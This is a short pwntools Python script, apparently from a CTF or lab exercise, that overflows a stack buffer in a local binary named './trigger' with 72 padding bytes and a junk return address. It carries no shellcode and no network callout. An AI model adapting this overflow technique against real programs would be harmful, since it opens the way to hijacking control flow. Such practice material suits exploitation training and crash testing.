#!/usr/bin/env python3
from pwn import *

offset = 72
payload = b'A' * offset + p64(0x4141414141414141)   # 非法返回地址

p = process('./trigger')
p.send(payload)
p.interactive()